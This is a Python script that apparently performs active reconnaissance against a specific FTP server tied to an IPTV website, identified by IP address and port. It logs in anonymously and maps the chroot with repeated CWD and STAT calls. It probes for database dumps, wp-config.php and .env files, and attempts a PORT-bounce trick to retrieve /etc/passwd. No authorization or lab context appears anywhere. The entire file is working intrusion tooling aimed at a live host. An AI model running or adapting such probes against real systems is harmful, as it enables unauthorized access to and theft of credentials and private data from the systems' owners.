#!/usr/bin/env python3
"""Deep FTP exploration with single CWD per connection."""
import ftplib

HOST = "103.160.107.175"
PORT = 6969
MAP = "/home/ubuntu/iptvgear.site/recon/active/ftp_filesystem.txt"

def log(msg=""):
    with open(MAP, "a") as f:
        f.write(msg + "\n")
    print(msg)

def single_cwd_stat(path, label=""):
    log(f"\n--- FRESH CONNECTION CWD: {path} ---")
    try:
        ftp = ftplib.FTP()
        ftp.connect(HOST, PORT, timeout=15)
        ftp.login("anonymous", "anonymous@test.com")
        
        if path:
            try:
                r = ftp.sendcmd(f"CWD {path}")
                log(f"CWD {path}: {r}")
            except Exception as e:
                log(f"CWD {path} FAILED: {e}")
                ftp.quit()
                return
        
        try:
            pwd = ftp.pwd()
            log(f"PWD: {pwd}")
        except Exception as e:
            log(f"PWD error: {e}")
        
        try:
            stat = ftp.sendcmd("STAT")
            log(f"STAT:\n{stat}")
        except Exception as e:
            log(f"STAT error: {e}")
        
        # Also try STAT with path as arg
        try:
            stat_arg = ftp.sendcmd(f"STAT {path}")
            log(f"STAT {path}:\n{stat_arg}")
        except:
            pass
        
        # CWD to .. and check
        try:
            r = ftp.sendcmd("CWD ..")
            log(f"CWD ..: {r}")
            pwd2 = ftp.pwd()
            log(f"PWD after ..: {pwd2}")
            stat2 = ftp.sendcmd("STAT")
            log(f"STAT after ..:\n{stat2}")
        except Exception as e:
            log(f"CWD .. error: {e}")
        
        ftp.quit()
    except Exception as e:
        log(f"Connection error: {e}")

# Test each actual entry found in the root listing
log("\n\n###### TESTING ACTUAL DIRECTORIES IN CHROOT ######")
for d in ["FTP-shared", "lost+found", "root"]:
    single_cwd_stat("", f"Root first")
    single_cwd_stat(d, f"CWD to: {d}")

# Test that all the other paths actually work  
log("\n\n###### VERIFY CWD TO NON-EXISTENT PATHS ######")
import ftplib
ftp = ftplib.FTP()
ftp.connect(HOST, PORT, timeout=15)
ftp.login("anonymous", "anonymous@test.com")

# First STAT the actual root
log(f"\nInitial STAT:")
log(ftp.sendcmd("STAT"))

# Try CWD to /nonexistent_path_xyz 
try:
    r = ftp.sendcmd("CWD /nonexistent_path_xyz")
    log(f"CWD /nonexistent_path_xyz: {r}")
except Exception as e:
    log(f"CWD /nonexistent_path_xyz error: {e}")

try:
    log(f"PWD: {ftp.pwd()}")
except Exception as e:
    log(f"PWD error: {e}")

try:
    log(ftp.sendcmd("STAT"))
except Exception as e:
    log(f"STAT error: {e}")

ftp.quit()

# Test SIZE and MDTM on files in the visible directories
log("\n\n###### SIZE/MDTM ON FILES IN FTP-shared AND root ######")
paths_in_visible = [
    "FTP-shared/test.txt", "FTP-shared/file.txt", 
    "FTP-shared/readme", "FTP-shared/index.html",
    "FTP-shared/backup.sql", "FTP-shared/dump.sql",
    "FTP-shared/wp-config.php", "FTP-shared/.env",
]

for p in paths_in_visible:
    try:
        ftp = ftplib.FTP()
        ftp.connect(HOST, PORT, timeout=15)
        ftp.login("anonymous", "anonymous@test.com")
        for cmd in ["MDTM", "SIZE"]:
            try:
                r = ftp.sendcmd(f"{cmd} {p}")
                log(f"{cmd} {p}: {r}")
            except:
                pass
        ftp.quit()
    except:
        pass

log("\n\n###### PORT MODE DOWNLOAD ATTEMPT ######")
try:
    ftp = ftplib.FTP()
    ftp.connect(HOST, PORT, timeout=15)
    ftp.login("anonymous", "anonymous@test.com")
    
    # Try PORT with server's own IP
    resp = ftp.sendcmd("PORT 103,160,107,175,27,57")  # port 6969 in p1,p2
    log(f"PORT with server IP: {resp}")
    
    # Try RETR
    resp = ftp.sendcmd("RETR /etc/passwd")
    log(f"RETR /etc/passwd: {resp}")
    ftp.quit()
except Exception as e:
    log(f"PORT mode error: {e}")